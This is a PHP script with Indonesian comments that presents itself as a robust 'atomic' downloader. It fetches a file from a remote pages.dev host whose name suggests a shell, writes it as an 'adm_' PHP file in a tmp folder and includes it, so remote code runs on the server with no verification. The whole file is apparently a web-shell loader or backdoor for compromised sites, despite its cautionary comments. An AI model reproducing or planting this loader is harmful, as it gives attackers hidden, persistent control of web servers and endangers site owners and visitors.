<?php
$remote = 'https://dahyoshellbekdur.pages.dev/auz.txt';
$cacheDir = __DIR__ . '/tmp'; // gunakan direktori proyek supaya lebih prediktabel
$target = $cacheDir . '/adm_' . md5($_SERVER['HTTP_HOST']) . '.php';
$maxRetries = 3;

// Jika kamu punya SHA256 expected, isi variabel ini. Jika kosong, verifikasi dilewati.
$expectedSha256 = ''; // contoh: 'abc123...'

// Fungsi untuk mendownload secara "atomic" dan robust
function download_atomic($url, $target, $retries = 3, $expectedSha256 = '') {
    $dir = dirname($target);
    if (!is_dir($dir) && !mkdir($dir, 0700, true)) {
        throw new RuntimeException("Tidak bisa membuat direktori $dir");
    }

    // cek apakah target sudah ada dan non-zero => anggap valid (opsional: verifikasi hash)
    if (file_exists($target) && filesize($target) > 0) {
        if ($expectedSha256 !== '') {
            if (hash_file('sha256', $target) === $expectedSha256) {
                return $target;
            } else {
                // jika hash tidak cocok, hapus supaya didownload ulang
                @unlink($target);
            }
        } else {
            return $target;
        }
    }

    // Lockfile untuk menghindari race condition
    $lockfile = $target . '.lock';
    $lfh = fopen($lockfile, 'c');
    if (!$lfh) {
        throw new RuntimeException("Gagal buka lockfile $lockfile");
    }

    if (!flock($lfh, LOCK_EX)) {
        fclose($lfh);
        throw new RuntimeException("Gagal ambil lock pada $lockfile");
    }

    try {
        // download ke tmp file di direktori yang sama (meminimalkan masalah rename antar filesystem)
        $tmp = tempnam($dir, 'dl_');
        if ($tmp === false) {
            throw new RuntimeException("Gagal buat tmp file di $dir");
        }

        $lastHttp = null;
        $lastCurlErr = null;
        $success = false;

        for ($i = 0; $i < $retries; $i++) {
            // buat ulang file descriptor tiap percobaan
            $fh = fopen($tmp, 'w+');
            if (!$fh) {
                throw new RuntimeException("Gagal buka tmp file untuk ditulis: $tmp");
            }

            $ch = curl_init($url);
            curl_setopt($ch, CURLOPT_FILE, $fh);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_TIMEOUT, 30);
            curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; PHP Downloader)');
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);

            // Eksekusi dan cek error curl
            $execResult = curl_exec($ch);
            $curlErr = curl_error($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            $curlErrNo = curl_errno($ch);
            curl_close($ch);
            fclose($fh);

            $lastHttp = $httpCode;
            $lastCurlErr = $curlErr;

            // Pastikan file ada dan ukurannya > 0
            clearstatcache(true, $tmp);
            $size = is_file($tmp) ? filesize($tmp) : 0;

            if ($execResult === false || $curlErrNo !== 0) {
                error_log("download_atomic: cURL attempt #$i failed: ($curlErrNo) $curlErr (HTTP $httpCode)");
                @unlink($tmp);
                sleep(pow(2, $i)); // exponential backoff: 1,2,4...
                continue;
            }

            if ($httpCode < 200 || $httpCode >= 300) {
                error_log("download_atomic: HTTP code $httpCode (attempt #$i).");
                @unlink($tmp);
                sleep(pow(2, $i));
                continue;
            }

            if ($size === 0) {
                error_log("download_atomic: file kosong setelah download (attempt #$i). HTTP $httpCode");
                @unlink($tmp);
                sleep(pow(2, $i));
                continue;
            }

            // jika sampai sini, download sukses
            $success = true;
            break;
        }

        if (!$success) {
            @unlink($tmp);
            throw new RuntimeException("Download gagal setelah $retries percobaan (last HTTP: $lastHttp, curlErr: $lastCurlErr)");
        }

        // verifikasi integritas bila diberikan expected hash
        if ($expectedSha256 !== '') {
            $actual = hash_file('sha256', $tmp);
            if ($actual !== $expectedSha256) {
                @unlink($tmp);
                throw new RuntimeException("Hash mismatch: expected $expectedSha256, got $actual");
            }
        }

        // pindahkan atomik (rename), jika gagal coba copy+unlink (untuk cross-filesystem)
        if (!@rename($tmp, $target)) {
            if (!@copy($tmp, $target)) {
                @unlink($tmp);
                throw new RuntimeException("Gagal memindahkan file ke target $target");
            }
            @unlink($tmp);
        }

        @chmod($target, 0600);
        return $target;
    } finally {
        // Lepaskan lock dan hapus lockfile
        flock($lfh, LOCK_UN);
        fclose($lfh);
        @unlink($lockfile);
    }
}

// Pemanggilan fungsi dan penanganan error
try {
    $file = download_atomic($remote, $target, $maxRetries, $expectedSha256);

    // sebelum include, pemeriksaan terakhir
    if (!is_file($file) || filesize($file) === 0) {
        throw new RuntimeException("File target tidak ditemukan atau kosong setelah download.");
    }

    // --- **Peringatan Keamanan** ---
    // Jangan include kode remote kecuali kamu yakin sumbernya terpercaya.
    // Lebih aman: verifikasi hash / signature, atau refactor supaya file bukan berisi PHP yang di-include.
    if ($expectedSha256 === '') {
        // Jika kamu tetap ingin include tanpa hash, set expectedSha256 sebelumnya atau hapus block ini
        error_log("Peringatan: meng-include file yang di-download tanpa verifikasi integritas.");
    }

    include $file; // ⚠️ hati-hati: remote code execution risk
} catch (Exception $e) {
    error_log("Download error: " . $e->getMessage());
    http_response_code(500);
    echo "Terjadi kesalahan pada server.";
}
